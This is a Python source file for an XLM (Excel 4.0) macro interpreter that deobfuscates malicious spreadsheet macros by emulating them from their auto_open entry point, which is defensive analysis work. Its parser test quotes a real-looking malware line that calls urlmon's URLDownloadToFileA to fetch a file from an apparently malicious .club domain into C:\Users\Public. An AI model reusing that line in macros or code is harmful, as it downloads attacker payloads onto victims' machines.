import argparse

from win32com.client import Dispatch
import re
import os
from lark import Lark
from lark.lexer import Token
from utils import *
from xlm_wrapper import XLMWrapper
from xlsm_wrapper import XLSMWrapper
from enum import Enum
import time
import datetime

class EvalStatus(Enum):
    FullEvaluation = 1
    PartialEvaluation = 2
    Error = 3
    NotImplemented = 4


class XLMInterpreter:
    def __init__(self, xlm_wrapper):
        self.xlm_wrapper = xlm_wrapper
        self.cell_addr_regex_str = r"((?P<sheetname>[^\s]+?|'.+?')!)?\$?(?P<column>[a-zA-Z]+)\$?(?P<row>\d+)"
        self.cell_addr_regex = re.compile(self.cell_addr_regex_str)
        macro_grammar = open('xlm-macro.lark', 'r', encoding='utf_8').read()
        self.xlm_parser = Lark(macro_grammar,  parser='lalr')
        self.defined_names = self.xlm_wrapper.get_defined_names()

    def parse_cell_address(self, cell_addr):
        res = self.cell_addr_regex.match(cell_addr)
        sheet_name = (res['sheetname'].strip('\'')) if (res['sheetname'] is not None) else None
        col = res['column'] if 'column' in res.re.groupindex else None
        row = res['row'] if 'row' in res.re.groupindex else None
        return sheet_name, col, int(row)

    def is_float(self, text):
        try:
            float(text)
            return True
        except ValueError:
            return False


    def get_cell(self, macrosheet, col, row):
        result = None
        current_row = row
        not_found = False

        while (col + str(current_row)) not in macrosheet['cells'] or macrosheet['cells'][col + str(current_row)]['formula'] is None:
            if (current_row - row) < 50:
                current_row += 1
            else:
                not_found = True
                break

        if not_found is False:
            cell_addr = col + str(current_row)
            result = macrosheet['cells'][cell_addr]

        return col, current_row, result

    def get_argument_length(self, arglist_node):
        result = None
        if arglist_node.data == 'arglist':
            result = len(arglist_node.children)
        return result

    def get_cell_addr(self, sheet, col, row, cell_parse_tree):
        result = None
        cell = cell_parse_tree.children[0]
        if cell.data == 'absolute_cell':
            res_sheet, res_col, res_row = self.parse_cell_address(cell.children[0])
            if res_sheet is None:
                res_sheet = sheet
        elif cell.data == 'relative_cell':
            raise Exception('Not implemented')
        else:
            raise Exception('Cell addresss, Syntax Error')

        return res_sheet, res_col, res_row

    def evaluate_parse_tree(self, macros, current_sheet_name, col, row, parse_tree_root):
        next_sheet = current_sheet_name
        next_col = col
        next_row = row
        status = EvalStatus.NotImplemented
        text = None

        if type(parse_tree_root) is Token:
            text = str(parse_tree_root)
            status = EvalStatus.FullEvaluation
        elif parse_tree_root.data == 'function_call':
            function_name = parse_tree_root.children[0]
            function_arguments = parse_tree_root.children[1]
            size = self.get_argument_length(function_arguments)
            if function_name == 'RUN':
                if size == 1:
                    next_sheet, next_col, next_row = self.get_cell_addr(current_sheet_name, col, row,
                                                                        function_arguments.children[0].children[0])
                    text = 'RUN({}!{}{})'.format(next_sheet, next_col, next_row)
                    status = EvalStatus.FullEvaluation
                elif size == 2:
                    text = 'RUN(reference, step)'
                    status = EvalStatus.NotImplemented
                else:
                    text = 'RUN() is incorrect'
                    status = status = EvalStatus.Error
            elif function_name == 'CHAR':
                next_sheet, next_col, next_row, status, text = self.evaluate_parse_tree(macros, current_sheet_name, col, row,
                                                                                function_arguments.children[0])
                if status == EvalStatus.FullEvaluation:
                    text = chr(int(text))
                    cell_col, cell_row, cell = self.get_cell(macros[current_sheet_name], col, row)
                    cell['value'] = text
                next_row += 1
            elif function_name == 'FORMULA':
                first_arg = function_arguments.children[0]
                next_sheet, next_col, next_row, status, text = self.evaluate_parse_tree(macros, current_sheet_name, col,
                                                                                row, first_arg)
                second_arg = function_arguments.children[1].children[0]
                res_sheet, res_col, res_row = self.get_cell_addr(current_sheet_name, col, row, second_arg)
                if status == EvalStatus.FullEvaluation:
                    macros[res_sheet]['cells'][res_col + str(res_row)] = {'formula': None, 'value': text}
                text = "FORMULA('{}',{})".format(text, '{}!{}{}'.format(res_sheet, res_col, res_row))
                next_row += 1

            elif function_name == 'CALL':
                arguments = []
                status = EvalStatus.FullEvaluation
                for argument in function_arguments.children:
                    next_sheet, next_col, next_row, tmp_status, text = self.evaluate_parse_tree(macros, current_sheet_name, col,
                                                                                    row, argument)
                    if tmp_status == EvalStatus.FullEvaluation:
                        arguments.append(text)
                    else:
                        status = tmp_status
                        arguments.append('not evaluated')

                next_row += 1
                text = 'CALL({})'.format(','.join(arguments))
            elif function_name == 'HALT':
                next_row = None
                next_col = None
                next_sheet = None
                text = 'HALT()'
                status = EvalStatus.FullEvaluation
            elif function_name == 'GOTO':
                status = EvalStatus.NotImplemented
                text = 'GOTO()'
                next_sheet = None
            elif function_name.lower() in self.defined_names:
                cell_text = self.defined_names[function_name.lower()]
                next_sheet, next_col, next_row = self.parse_cell_address(cell_text)
                text = 'Label ' + function_name
                status = EvalStatus.FullEvaluation
            elif function_name == 'ERROR':
                next_row += 1
                text = 'ERROR'
                status = EvalStatus.FullEvaluation
            elif function_name == 'IF':
                if size == 3:
                    second_arg = function_arguments.children[1]
                    next_sheet, next_col, next_row, status, text = self.evaluate_parse_tree(macros, current_sheet_name, col,
                                                                                    row, second_arg)
                    if status == EvalStatus.FullEvaluation:
                        third_arg = function_arguments.children[2]

                else:
                    next_row +=1
                    status = EvalStatus.FullEvaluation

                text = 'IF'
            elif function_name == 'NOW':
                text = datetime.datetime.now()
                status = EvalStatus.FullEvaluation
            elif function_name == 'DAY':
                first_arg = function_arguments.children[0]
                next_sheet, next_col, next_row, status, text = self.evaluate_parse_tree(macros, current_sheet_name, col,
                                                                                row, first_arg)
                if status == EvalStatus.FullEvaluation:
                    if type(text) is datetime.datetime:
                        text= str(text.day)
                        status = EvalStatus.FullEvaluation
                    elif self.is_float(text):
                        text = 'DAY(Serial Date)'
                        status = EvalStatus.NotImplemented

            else:
                text = function_name
                next_sheet = None
                status = EvalStatus.NotImplemented
                # raise Exception('Not implemented')

        elif parse_tree_root.data == 'method_call':
            text = '{}.{}()'.format(parse_tree_root.children[0], parse_tree_root.children[1])
            next_row += 1
            status = EvalStatus.NotImplemented
            # raise Exception('Not Implemented')
        elif parse_tree_root.data == 'cell':
            sheet_name, col, row = self.get_cell_addr(current_sheet_name, col, row, parse_tree_root)
            cell_addr = col + str(row)
            if cell_addr in macros[sheet_name]['cells']:
                cell = macros[sheet_name]['cells'][col + str(row)]
                text = cell['value']
                status = EvalStatus.FullEvaluation
            else:
                status = EvalStatus.PartialEvaluation
                text = "{}!{}".format(sheet_name,cell_addr)
        elif parse_tree_root.data == 'binary_expression':
            left_arg = parse_tree_root.children[0]
            next_sheet, next_col, next_row, l_status, text_left = self.evaluate_parse_tree(macros, current_sheet_name, col, row,
                                                                                 left_arg)
            operator = str(parse_tree_root.children[1].children[0])
            right_arg = parse_tree_root.children[2]
            next_sheet, next_col, next_row, r_status, text_right = self.evaluate_parse_tree(macros, current_sheet_name,
                                                                                          col, row,
                                                                                          right_arg)
            if l_status == EvalStatus.FullEvaluation and r_status == EvalStatus.FullEvaluation:
                status = EvalStatus.FullEvaluation
                if operator == '-':
                    text = str(int(text_left) - int(text_right))
                elif operator == '+':
                    text = str(int(text_left) + int(text_right))
                elif operator == '*':
                    text = str(int(text_left) * int(text_right))
                elif operator == '&':
                    text = text_left + text_right
                else:
                    text = 'Operator ' + operator
                    status = EvalStatus.NotImplemented
            else:
                status = EvalStatus.PartialEvaluation
                text = '{}{}{}'.format(text_left,operator, text_right)
        else:
            status = EvalStatus.FullEvaluation
            for child_node in parse_tree_root.children:
                if child_node is not None:
                    next_sheet, next_col, next_row, tmp_status, text = self.evaluate_parse_tree(macros, current_sheet_name, col,
                                                                                    row, child_node)
                    if tmp_status != EvalStatus.FullEvaluation:
                        status = tmp_status


        return next_sheet, next_col, next_row, status, text

    def deobfuscate_macro(self):
        result = []

        auto_open_labels = self.xlm_wrapper.get_defined_name('_xlnm.auto_open', full_match=False)
        for auto_open_label in auto_open_labels:
            sheet_name, col, row = self.parse_cell_address(auto_open_label[1])
            macros = self.xlm_wrapper.get_xlm_macros()
            current_col, current_row, current_cell = self.get_cell(macros[sheet_name], col, row)

            while current_cell is not None:
                parse_tree = self.xlm_parser.parse(current_cell['formula'])
                next_sheet, next_col, next_row, status, text = self.evaluate_parse_tree(macros, sheet_name, current_col,
                                                                                current_row,
                                                                                parse_tree)
                yield (sheet_name, current_col, current_row, current_cell['formula'], status, text)
                if next_sheet is not None:
                    current_col, current_row, current_cell = self.get_cell(macros[next_sheet], next_col, next_row)
                    sheet_name = next_sheet
                else:
                    break


def test_parser():
    macro_grammar = open('xlm-macro.lark', 'r', encoding='utf_8').read()
    xlm_parser = Lark(macro_grammar, parser='lalr')

    print("\n=171*GET.CELL(19,A81)")
    print(xlm_parser.parse("=171*GET.CELL(19,A81)"))
    print("\n=FORMULA($ET$1796&$BE$1701&$DB$1527&$BU$714&$CT$1605)")
    print(xlm_parser.parse("=FORMULA($ET$1796&$BE$1701&$DB$1527&$BU$714&$CT$1605)"))
    print("\n=RUN($DC$240)")
    print(xlm_parser.parse("=RUN($DC$240)"))
    print("\n=CHAR($IE$1109-308)")
    print(xlm_parser.parse("=CHAR($IE$1109-308)"))
    print("\n=CALL($C$649,$FN$698,$AM$821,0,$BB$54,$BK$36,0,0)")
    print(xlm_parser.parse("=CALL($C$649,$FN$698,$AM$821,0,$BB$54,$BK$36,0,0)"))
    print("\n=HALT()")
    print(xlm_parser.parse("=HALT()"))
    print('\n=WAIT(NOW()+"00:00:03")')
    print(xlm_parser.parse('=WAIT(NOW()+"00:00:03")'))
    print("\n=IF(GET.WORKSPACE(19),,CLOSE(TRUE))")
    print(xlm_parser.parse("=IF(GET.WORKSPACE(19),,CLOSE(TRUE))"))
    print(
        """\n=IF(R[-1]C<0,CALL("urlmon","URLDownloadToFileA","JJCCJJ",0,"https://ddfspwxrb.club/fb2g424g","c:\\Users\\Public\\bwep5ef.html",0,0),)""")
    print(xlm_parser.parse(
        """=IF(R[-1]C<0,CALL("urlmon","URLDownloadToFileA","JJCCJJ",0,"https://ddfspwxrb.club/fb2g424g","c:\\Users\\Public\\bwep5ef.html",0,0),)"""))


if __name__ == '__main__':

    # path = r"C:\Users\user\Downloads\xlsmtest.xlsm"
    # 01558388b33abe05f25afb6e96b0c899221fe75b037c088fa60fe8bbf668f606
    # 63bacd873beeca6692142df432520614a1641ea395adaabc705152c55ab8c1d7
    # b5cd024106fa2e571b8050915bcf85a95882ee54173a7a8020bfe69d1dea39c7
    # 4dcee9176ca1241b6a25182f778db235a23a65b86161d0319318c4923c3dc6e6

    arg_parser = argparse.ArgumentParser()
    arg_parser.add_argument("-f", "--file", type=str, help="The path of a XLSM file")
    args = arg_parser.parse_known_args()
    if args[0].file is not None:
        file_path = args[0].file

        start = time.time()
        xlsm_doc = XLSMWrapper(file_path)
        interpreter = XLMInterpreter(xlsm_doc)

        for step in interpreter.deobfuscate_macro():
            # print('RAW:\t{}\t\t{}'.format(step[1]+ str(step[2]), step[3]))
            desc = ''
            if step[4] == EvalStatus.FullEvaluation:
                desc = 'FE'
            elif step[4] == EvalStatus.PartialEvaluation:
                desc = 'PE'
            elif step[4] == EvalStatus.NotImplemented:
                desc = 'NI'
            else:
                desc = 'ERR'

            print('CELL:{}\t\t{}\t{}'.format(step[1] + str(step[2]), desc, step[5]))

        end = time.time()
        print('time elapsed: '+ str(end - start))
    else:
        arg_parser.print_help()